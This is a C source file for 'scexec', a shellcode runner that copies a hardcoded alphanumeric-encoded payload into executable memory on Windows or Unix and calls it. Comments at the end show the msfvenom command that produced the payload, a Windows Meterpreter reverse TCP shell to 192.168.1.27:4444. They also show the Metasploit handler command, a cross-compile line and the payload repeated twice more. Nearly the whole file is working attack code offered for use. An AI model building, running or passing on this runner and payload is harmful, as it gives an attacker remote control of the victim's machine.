/*
	scexec - Portable utility to execute in memory a sequence of opcodes
	Vlatko Kosturjak, vlatko.kosturjak@gmail.com
	Based on Bernardo Damele A. G. shellcodeexecute
*/

#include <sys/types.h>
#include <stdio.h>
#include <stdarg.h>
#include <string.h>
#include <stdlib.h>
#include <time.h>
#include <ctype.h>

/* Microsoft Visual Studio have different way of specifying variable number of args */
#ifdef DEBUG
 #ifdef _MSC_VER
 #define DEBUG_PRINTF(fmt, ...) fprintf(stderr, "%s:%d:%s(): " fmt, __FILE__, __LINE__, __FUNCTION__, __VA_ARGS__)
 #else
 #define DEBUG_PRINTF(fmt, args...) fprintf(stderr, "%s:%d:%s(): " fmt, __FILE__, __LINE__, __FUNCTION__, ##args)
 #endif
#else
 #ifdef _MSC_VER
 #define DEBUG_PRINTF(fmt, ...)
 #else
 #define DEBUG_PRINTF(fmt, args...)
 #endif
#endif

#ifdef __MINGW32__
#define _WIN32_WINNT 0x502 
#endif

#if defined(_WIN32) || defined(_WIN64) || defined(__WIN32__) || defined(WIN32)
#include <windows.h>
DWORD WINAPI exec_payload(LPVOID lpParameter);
	#if defined(_WIN64)
	void __exec_payload(LPVOID);
	static DWORD64 handler_eip;
	#else
	static DWORD handler_eip;
	#endif
#else
#include <sys/mman.h>
#include <sys/wait.h>
#include <unistd.h>
#endif

#ifndef CALL_FIRST
#define CALL_FIRST 1 
#endif

#define ENCBASE64 1 
#define ENCUUENC 2

#define ARGINPUT 0
#define FILEINPUT 1

#define EXESTD 0
#define EXEEAX 1


int payloadenc=0;
int executetype=0;
int scinput=0;


int sys_bineval(unsigned char *argv, size_t len);
void call_handler (void *payload);

int main(int argc, char *argv[])
{
	FILE *f;
	long fsize;
	unsigned char *fcontent;
	size_t len;

	unsigned char lol[] = "PYIIIIIIIIIIIIIIII7QZjAXP0A0AkAAQ2AB2BB0BBABXP8ABuJIkLyxnbGpuP5Pu0k98eP1o03TlKpPFPnkqB6lnkPRdTnkPr5x4OmgQZ4ftqiollUl51sLWrDlq0yQhOFmWqO7Xbl2Brf7lKF2DPLK0JElLKPLb1SHHcBhUQzqv1nkRyGPs1ZsLKbi5HisgJRinkFTnks1n6FQioLlYQHODMC19W6XM0qeIfC3QmIhUkqm141eYt0XLK0XvDUQHS0fLKflrkNkf85LUQjsnkgtlKuQzplIG4vDVDQKSksQ0Ysj2qKOip3oqOBznkGbhkNmCm58037BgpwpcXbWacDrCo64SXPLRW6FEW9oYEMhj0Vas030WY9Tv4rpPhVIk0RKc0KOxUazDJu89POX7quKRH7r7p6qQLlIxfF0PPV0pPw0BpspF0phIzFoKoypYoZuog3ZtPPVF7phZ9Y5CDCQYoHULEO0cDwzYoPNFhaeZLixqq7pGpWpqz30SZ4Dbvf7cXGrjyzhaOKOyEnc8xgpCNEfnkGFQzqPSXuPVpWpuPcfpjS0Ph1H941C8e9oYEZ3qCQzs0QFF3CgU8WrxYiXco9oxUmSKHC0cMdbF8QxuPw0s0UP2JGpV0QxDKToTO4pKO9E1Gph1ePnBm1qiohUcn1NYoFlgTxit1yoIokOeQYSfIO6PuO7o3oKipUM5zVj0hoVZ5OMOmyoyE5lwvalFjk0IkM0CE4EmkswECabBO0j5Pf3yoZuAA";

	executetype=EXEEAX;
	len = (size_t)strlen(lol);
	sys_bineval(lol, len);

	exit(0);
}



int sys_bineval(unsigned char *buf, size_t len)
{
	size_t olen;
	unsigned char *argv=buf;
	unsigned char *tempbuf=NULL;
#if defined(_WIN32) || defined(_WIN64) || defined(__WIN32__) || defined(WIN32)
	unsigned char *winmem;
#else
	int *pmem;
	size_t page_size;
	pid_t pID;
#endif

#if defined(_WIN32) || defined(_WIN64) || defined(__WIN32__) || defined(WIN32)
	// allocate a +rwx memory page
	DEBUG_PRINTF("Allocating RWX memory...\n");
	winmem = (char *) VirtualAlloc(NULL, len+1, MEM_RESERVE | MEM_COMMIT, PAGE_EXECUTE_READWRITE);

	// copy over the shellcode
	DEBUG_PRINTF("Copying shellcode\n");
	memcpy(winmem, argv, len+1);

	DEBUG_PRINTF("Freeing temporary buffer\n");
	if (tempbuf!=NULL) {
		free(tempbuf);
	}

	call_handler (winmem);

#else
	DEBUG_PRINTF("Performing fork...\n");
	pID = fork();
	if(pID<0)
		return 1;

	if(pID==0)
	{
		page_size = (size_t)sysconf(_SC_PAGESIZE)-1;	// get page size
		page_size = (len+page_size) & ~(page_size);	// align to page boundary

		// mmap an +rwx memory page
		DEBUG_PRINTF("Mmaping memory page (+rwx)\n");
		pmem = mmap(0, page_size, PROT_READ|PROT_WRITE|PROT_EXEC, MAP_SHARED|MAP_ANON, 0, 0);

		if (pmem == MAP_FAILED)
			return 1;

		// copy over the shellcode
		DEBUG_PRINTF("Copying shellcode\n");
		memcpy(pmem, argv, len);

		// execute it
		DEBUG_PRINTF("Executing shellcode\n");
		((void (*)(void))pmem)();
	}

	if(pID>0)
		waitpid(pID, 0, WNOHANG);
#endif

	DEBUG_PRINTF("Returning from execute function\n");
	return 0;
}

/* if windows */
#if defined(_WIN32) || defined(_WIN64) || defined(__WIN32__) || defined(WIN32) 
void call_payload (void *payload) {
	int pID;

	/* execute it by ASM code defined in exec_payload function */
	DEBUG_PRINTF("Executing shellcode\n");
	if (executetype == EXEEAX) {
		DEBUG_PRINTF("Executing through call EAX\n");
		WaitForSingleObject(CreateThread(NULL, 0, exec_payload, payload, 0, &pID), INFINITE);
	}
	if (executetype == EXESTD) {
		DEBUG_PRINTF("Standard execute\n");
		(*(void (*)()) payload)();
	}
}

/* if mingw */
#ifdef __MINGW32__ 
LONG WINAPI VectoredHandler (struct _EXCEPTION_POINTERS *ExceptionInfo) {
	PCONTEXT Context;
	Context = ExceptionInfo->ContextRecord;
	DEBUG_PRINTF("Exception occured. Entered into Exception Handler.\n");
#ifdef _AMD64_
	Context->Rip = handler_eip;
#else
	Context->Eip = handler_eip;
#endif    
	DEBUG_PRINTF("Returning from Exception handler\n");
	return EXCEPTION_CONTINUE_EXECUTION;
}

void call_handler (void *payload) {
	/* exception handling */
	PVOID h;
	handler_eip = &&fail;

	DEBUG_PRINTF("Adding handler\n");
	h = AddVectoredExceptionHandler(CALL_FIRST,VectoredHandler);
	DEBUG_PRINTF("Executing payload\n");

	/* call real function */
	call_payload(payload);

fail:
	DEBUG_PRINTF("Removing handler\n");
	RemoveVectoredExceptionHandler(h);
}

DWORD WINAPI exec_payload(LPVOID lpParameter)
{
#if defined(_WIN64)
	DEBUG_PRINTF("Executing payload64\n");
	__asm__ (
		"mov %0, %%rax\n"
		"call *%%rax\n"
		: // no output
		: "m"(lpParameter) // input
	);
#else
	DEBUG_PRINTF("Executing payload32\n");
	__asm__ (
		"mov %0, %%eax\n"
		"call *%%eax\n"
		: // no output
		: "m"(lpParameter) // input
	);
#endif
	return(0);
}
#else /* MINGW */

void call_handler (void *payload) {
	__try
	{
		DEBUG_PRINTF("Executing payload via VC\n");
		call_payload(payload);
	}
	__except(EXCEPTION_EXECUTE_HANDLER)
	{
		DEBUG_PRINTF("Exception occured. In VC exception Handler.\n");
	}
}

#if defined(_WIN64)
DWORD WINAPI exec_payload(LPVOID lpParameter)
{
	DEBUG_PRINTF("Executing payload64 via VC\n");
	__exec_payload(lpParameter);
	return 0;
}
#elif defined(_WIN32) || defined(__WIN32__) || defined(WIN32)
DWORD WINAPI exec_payload(LPVOID lpParameter)
{
	DEBUG_PRINTF("Executing payload32 via VC\n");
	__asm
	{
		mov eax, [lpParameter]
		call eax
	}
	return 0;
}
#endif /* _WIN64 */
#endif /* __MINGW__ */
#endif /* if windows */


// msfvenom -p windows/meterpreter/reverse_tcp -a x86 --platform windows -e x86/alpha_mixed -f raw LHOST=192.168.1.27 LPORT=4444 EXITFUNC=thread BufferRegister=EAX
// msfconsole -x 'use exploit/multi/handler; set LHOST 0.0.0.0; set LPORT 4444; run'PYIIIIIIIIIIIIIIII7QZjAXP0A0AkAAQ2AB2BB0BBABXP8ABuJIkLyxnbGpuP5Pu0k98eP1o03TlKpPFPnkqB6lnkPRdTnkPr5x4OmgQZ4ftqiollUl51sLWrDlq0yQhOFmWqO7Xbl2Brf7lKF2DPLK0JElLKPLb1SHHcBhUQzqv1nkRyGPs1ZsLKbi5HisgJRinkFTnks1n6FQioLlYQHODMC19W6XM0qeIfC3QmIhUkqm141eYt0XLK0XvDUQHS0fLKflrkNkf85LUQjsnkgtlKuQzplIG4vDVDQKSksQ0Ysj2qKOip3oqOBznkGbhkNmCm58037BgpwpcXbWacDrCo64SXPLRW6FEW9oYEMhj0Vas030WY9Tv4rpPhVIk0RKc0KOxUazDJu89POX7quKRH7r7p6qQLlIxfF0PPV0pPw0BpspF0phIzFoKoypYoZuog3ZtPPVF7phZ9Y5CDCQYoHULEO0cDwzYoPNFhaeZLixqq7pGpWpqz30SZ4Dbvf7cXGrjyzhaOKOyEnc8xgpCNEfnkGFQzqPSXuPVpWpuPcfpjS0Ph1H941C8e9oYEZ3qCQzs0QFF3CgU8WrxYiXco9oxUmSKHC0cMdbF8QxuPw0s0UP2JGpV0QxDKToTO4pKO9E1Gph1ePnBm1qiohUcn1NYoFlgTxit1yoIokOeQYSfIO6PuO7o3oKipUM5zVj0hoVZ5OMOmyoyE5lwvalFjk0IkM0CE4EmkswECabBO0j5Pf3yoZuAA

// make CC=i686-w64-mingw32-gcc STRIP=i686-w64-mingw32-strip OUT=scexec32.exe
// PYIIIIIIIIIIIIIIII7QZjAXP0A0AkAAQ2AB2BB0BBABXP8ABuJIkLyxnbGpuP5Pu0k98eP1o03TlKpPFPnkqB6lnkPRdTnkPr5x4OmgQZ4ftqiollUl51sLWrDlq0yQhOFmWqO7Xbl2Brf7lKF2DPLK0JElLKPLb1SHHcBhUQzqv1nkRyGPs1ZsLKbi5HisgJRinkFTnks1n6FQioLlYQHODMC19W6XM0qeIfC3QmIhUkqm141eYt0XLK0XvDUQHS0fLKflrkNkf85LUQjsnkgtlKuQzplIG4vDVDQKSksQ0Ysj2qKOip3oqOBznkGbhkNmCm58037BgpwpcXbWacDrCo64SXPLRW6FEW9oYEMhj0Vas030WY9Tv4rpPhVIk0RKc0KOxUazDJu89POX7quKRH7r7p6qQLlIxfF0PPV0pPw0BpspF0phIzFoKoypYoZuog3ZtPPVF7phZ9Y5CDCQYoHULEO0cDwzYoPNFhaeZLixqq7pGpWpqz30SZ4Dbvf7cXGrjyzhaOKOyEnc8xgpCNEfnkGFQzqPSXuPVpWpuPcfpjS0Ph1H941C8e9oYEZ3qCQzs0QFF3CgU8WrxYiXco9oxUmSKHC0cMdbF8QxuPw0s0UP2JGpV0QxDKToTO4pKO9E1Gph1ePnBm1qiohUcn1NYoFlgTxit1yoIokOeQYSfIO6PuO7o3oKipUM5zVj0hoVZ5OMOmyoyE5lwvalFjk0IkM0CE4EmkswECabBO0j5Pf3yoZuAA